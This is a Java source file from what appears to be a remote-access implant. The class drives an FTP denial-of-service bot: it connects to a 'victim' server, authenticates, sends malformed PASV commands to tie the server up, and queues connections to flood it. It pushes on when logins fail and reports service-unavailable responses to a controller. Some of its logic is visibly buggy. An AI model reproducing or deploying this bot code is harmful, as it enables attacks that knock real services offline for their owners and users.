/**
 * @author Solomon Sonya
 */

package Implant.Payloads.DOS_Bot.FTP_DOS_Bot;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.*;

import javax.net.ssl.*;
import javax.net.*;
import java.awt.event.*;

import Controller.Drivers.Drivers;
import Implant.Driver;
import Implant.Splinter_IMPLANT;
import java.util.*;

import javax.swing.Timer;


public class FTP_Object
{
		public volatile static FTP_ServerSocket_Receive_Data ftp_ServerSocket = null;
		
		public static final String myClassName = "FTP_Object";
		public static volatile boolean run_DOS_Bot = false;
		
		public volatile String victimAddress = "";


		public volatile boolean authenticationSuccessful = false;
		public volatile static boolean forceCommand_Even_If_Authentication_Fail = true;
		
		public Splinter_IMPLANT implant = null;
		
		public static volatile boolean informedControllerOfDOS = false;
		public static volatile boolean informedSOP_Of_DOS = false;
		
		public static volatile boolean informedControllerOfDOS_UserName_or_PasswordFail = false;
		public static volatile boolean informedSOP_Of_DOS_UserNameFail = false;
		
		public static volatile boolean informedController_Auth_Fail_But_Will_Force_Command = false;
		
		
		public static volatile boolean informedControllerOf_Null_Line = false;
		public static volatile boolean informedSOP_Of_informedControllerOf_Null_Line = false;
					
		public Socket mySocket = null;
		public BufferedReader brIn = null; 
		public PrintWriter pwOut = null;
		
		int victimControlPort = 21;
		int victimDataPort = 20;
		
		String user = "anonymous";
		String pass = "";
			
		DOS_Bot_FTP_Director parent = null;
		
		boolean dismissSuperfluous_Status_220_Codes = false;//this is used where the FTP Server banner could return ultiple banner lines, after reading the first line, dismiss all others because we have already transmitted the user name to the server
		
		
		public volatile boolean errorDetectedDuringInitiation = false;
		
		public FTP_Object(String victimNet, int victimCtrlPrt, int victimDataPrt, String usrNme, String password, DOS_Bot_FTP_Director par)
		{
			try
			{
				parent = par;
				
				victimAddress = victimNet;
				
				victimControlPort = victimCtrlPrt;
				victimDataPort = victimDataPrt;
				
				user = usrNme;
				pass = password;
				
				
				if(victimControlPort < 1 || victimControlPort > 65534)
				{
					Driver.sop("* * * Victim FTP Control Port [" + victimControlPort + "] is out of range, defaulting to port 21 * * *");
					this.sendToController("* * * Victim FTP Control Port [" + victimControlPort + "] is out of range, defaulting to port 21 * * *");
					victimControlPort = 21;
				}
				
				if(victimDataPort < 1 || victimDataPort > 65534)
				{
					Driver.sop("* * Victim FTP Data Port [" + victimDataPort + "] is out of range, defaulting to port 20 * *");
					this.sendToController("* * Victim FTP Data Port [" + victimDataPort + "] is out of range, defaulting to port 20 * *");
					victimControlPort = 20;
				}
				
				//authenticate with FTP Server
				boolean autheicationComplete = this.instantiate_FTP_Socket_Authenticate();
				
				if(autheicationComplete)
				{
					errorDetectedDuringInitiation = true;
				}
				else
				{
					errorDetectedDuringInitiation = false;
				}
				
				 
				
			}
			catch(Exception e)
			{
				Driver.eop("Constructor", myClassName, e, "", false);
			}
		}
		
		
		public boolean instantiate_FTP_Socket_Authenticate() 
		{
			try
			{
				//Driver.sop("Attempting to establish socket to: " + this.victimAddress + " : " + this.victimPort);
				
				//establish socket
				mySocket = new Socket(this.victimAddress, this.victimControlPort);
				
				//input from implant
				brIn = new BufferedReader(new InputStreamReader(mySocket.getInputStream()));
				
				//output to implant
				pwOut = new PrintWriter(new BufferedOutputStream(mySocket.getOutputStream()));
				
				//Streams opened
				//Drivers.sop("Streams opened");
				
				boolean success = sendInitialAuthenticateCommand();
				
				
				
				/*String line = "";
				while((line = brIn.readLine()) != null )
				{
					Driver.sop(line);
				}*/
				
				return success;				
			}
			catch(ConnectException ce)
			{
				//these exceptions are usually generated when "Connection refused is encountered!!!!" --> thus the DOS
				try
				{
					if(implant != null && !informedControllerOfDOS)
					{
						implant.sendToController("FTP Orbiter DOS Bot: \"Connection refused detected!!!!", false, true);
						informedControllerOfDOS = true;
					}
					
					if(!informedSOP_Of_DOS)
					{
						Driver.sop("FTP Orbiter DOS Bot: \"Connection refused detected!!!!");
						informedSOP_Of_DOS = true;
					}
					
				}catch(Exception ee){}
				
				//return true here, bcs, we don't want to stop the DOS at this point!
				return true;
			}
			catch(UnknownHostException uhe)
			{
				implant.sendToController("Invalid FTP DOS Site specified. Terminating now...", false, false);
				errorDetectedDuringInitiation = true;
				return false;
			}
			catch(Exception e)
			{
				Driver.eop("instantiate_FTP_Socket_Authenticate", myClassName, e, "", false);
				
			}
			
			return false;
		}
		
		public boolean sendInitialAuthenticateCommand()
		{
			try
			{
				if(this.mySocket == null || !mySocket.isConnected() || this.pwOut == null || this.brIn == null)
				{					
					return false;
				}
				
				if(errorDetectedDuringInitiation)
				{
					return false;
				}
				
				if(this.mySocket != null && mySocket.isConnected() && this.pwOut != null && brIn != null)
				{
					//let the processStatusCode mtd handle what to do based on the status code received from the connection
					String firstLine = brIn.readLine();
					
					processStatusCode(firstLine);
					
					//
					//Read the first line, this should be a status code: 220 "service is ready for new user"
					//
//					String initialStatusCode = brIn.readLine();
//					
//					if(initialStatusCode != null && initialStatusCode.trim().startsWith("220"))
//					{
//						Driver.sop("Status 220 received: service is ready for new user");
//					}
//					
//					//
//					//SEND USER NAME
//					//
//					pwOut.write("USER " + user + "\r\n");
//					pwOut.flush();
//					
//					//at this point, the server could still be providing the welcome banner, continue reading until we have an adequate response										
//					//next, expect to receive status code: 331: user name okay, need password
//					String userResponse = brIn.readLine();
//					
//					while(userResponse != null && userResponse.trim().startsWith("220"))
//					{
//						//read the line and discard the data
//						userResponse = brIn.readLine();
//					}										
//					
//					//Dropped out, this means we have a new status code to execute
//					if(userResponse != null && userResponse.trim().startsWith("331"))
//					{
//						Driver.sop("Status 331 received: user name okay, password required");
//					}
//					
//					//Driver.jop("User Response: " + userResponse);
//					
//					//
//					//SEND PASSWORD
//					//
//					pwOut.write("PASS " + pass + "\r\n");
//					pwOut.flush();
//					
//					//
//					//this response may be an encoded IP address and port to connect for data
//					//ref RFC 959
//					//
//					String passResponse = brIn.readLine();
//					
//					Driver.jop("Pass Response: " + passResponse);
					
					//
					//Determine if logon is successful
					//
					/*if(passResponse != null && passResponse.trim().startsWith("230"))
					{
						Driver.jop("LOGON SUCCESSFUL!!!");
					}*/
					
				}
				
				
				return true;
			}
			catch(Exception e)
			{
				Driver.eop("sendInitialAuthenticateCommand", myClassName, e, "", false);
			}
			
			return false;
		}
		
		/**
		 * 
		 * This function reads the status code, and then based on the code invokes the appropriate action for the FTP server
		 * ref RFC 959
		 */
		public boolean processStatusCode(String line)
		{
			try
			{
				//always check if it is time to punt
				if(parent != null && !parent.run_DOS_Bot)
				{
					Driver.sop("PUNT!!! HALTING processStatusCode from FTP Server");
					return true;
				}
				
				//need to determine what to do if null line is receivd
				if(line == null)
				{
					Driver.sop("NULL LINE RECEIVED FROM FTP SERVER ; This is usually indicative of FTP server refusing or closing the connection");
					//this usually occurs as a result of the FTP server either refusing or closing the connection
					
					parent.sendToController("NULL LINE RECEIVED FROM FTP SERVER ; This is usually indicative of FTP server refusing or closing the connection");
					
					informedControllerOf_Null_Line = true;
					informedSOP_Of_informedControllerOf_Null_Line = true;
					
					//return false to remove this thread and continue with the others
					return false;
					
				}
				
				//if empty line received, read for the next line
				if(line != null && line.trim().equals(""))
				{
					//do nothing for now, and read the next line
					return processStatusCode(brIn.readLine());
				}
				
				//
				//STATUS CODE 220: service is ready for new user --> return user name if this is the first time we have encountered the 220 status code
				//
				if(line != null && line.trim().startsWith("220") && !dismissSuperfluous_Status_220_Codes)
				{
//Driver.sop("Status 220 received: service is ready for new user --> sending user name now...");
					
					//
					//SEND USER NAME
					//
					pwOut.write("USER " + user + "\r\n");
					pwOut.flush();
					
					//set boolean flag to dismiss all other 220 status codes (in case of multi-lined banner providing info to the FTP connecting client)
					dismissSuperfluous_Status_220_Codes = true;
					
					//process next status code
					return processStatusCode(brIn.readLine());
				}
				
				//
				//STATUS CODE 220: service is ready for new user but we have already returned the user name for authentication (this occurs if the FTP Server banner can have multiple lines of data, dismiss all others)
				//
				if(line != null && line.trim().startsWith("220") && dismissSuperfluous_Status_220_Codes)
				{
					//we have already sent the user name for authentication, dismiss this extra code
					
					//process next status code
					return processStatusCode(brIn.readLine());
				}
				
				//
				//STATUS CODE 331: user name okay, need password
				//
				if(line != null && line.trim().startsWith("331"))
				{
//Driver.sop("Status 331 received: user name okay, need password --> Sending password now...");
					
					//
					//SEND PASSWORD
					//
					pwOut.write("PASS " + pass + "\r\n");
					pwOut.flush();
					
					//process next status code
					return processStatusCode(brIn.readLine());
				}
				
				//
				//STATUS CODE 331: user name okay, need password
				//
				if(line != null && line.trim().startsWith("230"))
				{
//Driver.sop("Status 230 received: user logged in, proceed --> AUTHENTICATION SUCCESSFUL!. Sending request for TYPE I to enter interactive mode...");
					
					authenticationSuccessful = true;
					
					//
					//SEND REQUEST TYPE I --> to enter interactive mode
					//
					this.pwOut.write("TYPE I \r\n");
					this.pwOut.flush();
					
					//
					//READ LINE FOR SUCCESS TO BE IN INTERACTIVE MODE!
					//
					line = brIn.readLine();
					
					if(line != null && line.trim().startsWith("200"))
					{
//Driver.sop("Status 200 received: command okay --> We successfully entered interactive mode with the FTP server");
					}
					
					//
					//NOW SEND THE PORT command in which we (the client) set up a listener with a non-ephemeral port to have the FTP reach back out to us to provide data
					//perhaps just one listener will be acceptable. as soon as we receive this connection, listen across it
					//
					if(ftp_ServerSocket == null /*|| !ftp_ServerSocket.FTP_ServerSocket_is_Running*/)
					{
						ftp_ServerSocket = new FTP_ServerSocket_Receive_Data(0, this);
					}
					else//use one we already have established
					{
						this.Trigger_FTP_ServerSocket_is_Ready();
					}
					
					//when server socket is ready, have it trigger on the new address bcs it might not be setup by the time this function calls for the IP address
					
					//Driver.jop("FTP Address: " + ftp_ServerSocket.getFTP_ServerSocket_IP_Address() + " : " + ftp_ServerSocket.getFTP_ServerSocket_PORT());
					
					//process next status code
					return true;
				}
				
				if(line != null && line.trim().startsWith("421"))
				{					
										
					if(!informedControllerOfDOS) //do this check here to ensure current threads pull the updated value of this flag
					{
						Driver.sop("FTP Orbiter DOS Bot: Status Code 421 Received --> Service unavailable as reported by FTP Server. Message: \"" + line + "\"");
						parent.sendToController("FTP Orbiter DOS Bot: Status Code 421 Received --> Service unavailable as reported by FTP Server. Message: \"" + line + "\"");
						informedControllerOfDOS = true;
						informedSOP_Of_DOS = true;
					}
					
					//otherwise, we've already informed controller, do n/t										
					
					return true;
				}
				
				if(line != null && line.trim().startsWith("530"))
				{
					if(!informedControllerOfDOS_UserName_or_PasswordFail)
					{
						Driver.sop("FTP Orbiter DOS Bot: Status Code 530 Received --> User credentials are not authenticated. Message: \"" + line + "\"");
						parent.sendToController("FTP Orbiter DOS Bot: Status Code 530 Received --> User credentials are not authenticated. Message: \"" + line + "\"");
					
						informedControllerOfDOS_UserName_or_PasswordFail = true;	
					}
					
					//still add to queue to attempt dos with invalid creds
					parent.queFTP_Sockets.addLast(this);
					
					
					return true;
				}
				//
				//otherwise, unknown status code
				//
				Driver.sop("Unimplemented status code: " + line);
				
				
				//
				//read next input
				//
				return processStatusCode(brIn.readLine());
								
			}
			catch(Exception e)
			{
				Driver.eop("processStatusCode", myClassName, e, "", false);
			}
			
			return false;
			
		}
		
		public boolean Trigger_FTP_ServerSocket_is_Ready()
		{
			try
			{
				//come here after the FTP ServerSocket is established, now we're ready to send the PORT command to the FTP server
				/*String [] IP = ftp_ServerSocket.getFTP_ServerSocket_IP_Address().split('.');
				
				String IP_converted = "";
				IP_converted = IP[0];
				for(int i = 1; IP != null && i < IP.length; i++)
				{
					IP_converted = IP_converted + "," + IP[i];
				}*/
				
				String IP_converted = ftp_ServerSocket.getFTP_ServerSocket_IP_Address().replace('.', ',');
				
				//Driver.jop("IP: " + IP_converted);
				
				String PORT_HEX = Integer.toHexString(ftp_ServerSocket.getFTP_ServerSocket_PORT());
				
				//Driver.jop("PORT Converted: " + PORT_HEX);
				
				//SEPARATE THE HEX PORT INTO 2 NIBBLES
				String PORT_Nibble_1 = "";
				String PORT_Nibble_2 = "";
				
				if(PORT_HEX.length() == 4)
				{
					PORT_Nibble_1 = PORT_HEX.substring(0,2);
					PORT_Nibble_2 = PORT_HEX.substring(2);
				}
				else
				{
					PORT_Nibble_1 = PORT_HEX.substring(0,1);
					PORT_Nibble_2 = PORT_HEX.substring(1);
				}				
				
				//
				//SEND OVER THE PORT COMMAND
				//
				
				//pwOut.write("PORT " + IP_converted + "," + PORT_Nibble_1 + "," + PORT_Nibble_2 + "\r\n");
				pwOut.write("PASV " + IP_converted + "," + PORT_Nibble_1 + "," + PORT_Nibble_2 + "\r\n");//PASV VICE PORT MAY DELAY SERVER UP MORE
				pwOut.flush();
				
				//
				//READ THE NEXT LINE TO ENSURE COMMAND SUCCESSFUL
				//
				String line = brIn.readLine();
				
				if(line != null && line.startsWith("200"))
				{
//Driver.sop("Status 200 received: command okay --> We successfully sent over PORT command --> ready to issue commands");
				}
				
				//add self to the que to send commands now!!!
				parent.queFTP_Sockets.addLast(this);
				
				return true;
			}
			catch(Exception e)
			{
				//Driver.eop("Trigger_FTP_ServerSocket_is_Ready", myClassName, e, "", false);
				Driver.sop("ERROR - COULD NOT ESTABLISH FTP LISTENER ON CLIENT SIDE FROM FTP_Object");
				parent.sendToController("ERROR - COULD NOT ESTABLISH FTP LISTENER ON CLIENT SIDE FROM FTP_Object");
			}
			
			return false;
		}
		
		public boolean sendCommand(String command)
		{
			try
			{
				if(!authenticationSuccessful && !forceCommand_Even_If_Authentication_Fail)
				{
					//failed authentication, do not attempt to send command when not logged on, instead punt!
					Driver.sop("PUNT!!! AUTHENTICATION FAILED. Force command even if auth fail is not enabled. I WILL NOT SEND COMMAND");
					return false;
				}
				
				if(!authenticationSuccessful && forceCommand_Even_If_Authentication_Fail)
				{
					//failed authentication, do not attempt to send command when not logged on, instead punt!
					if(!informedController_Auth_Fail_But_Will_Force_Command)
					{
						Driver.sop("PUNT!!! AUTHENTICATION FAILED. However force command even if auth fail IS ENABLED. I WILL ATTEMPT TO SEND COMMAND. NOTE: DOS Growth may take a long time if you wish to proceed with invalid credentials");
						informedController_Auth_Fail_But_Will_Force_Command = true;
					}					
					
				}
				
				
				pwOut.write(command + "\r\n");
				pwOut.flush();
				
				//Driver.sop("FTP OVERRIDE IN FTP_OBJECT");
				return true;
			}
			catch(Exception e)
			{
				Driver.eop("sendCommand", myClassName, e, "", false);
			}
			
			return false;
		}
		
		
		
		
		public boolean sendToController(String strToSend)
		{
			try
			{
				if(implant != null)
				{
					implant.sendToController(strToSend, false, false);				
				}						
				
				return true;
			}
			catch(Exception e)
			{
				Driver.eop("sendToController", myClassName, e, e.getLocalizedMessage(), false);
			}
			
			return false;
		}

	}


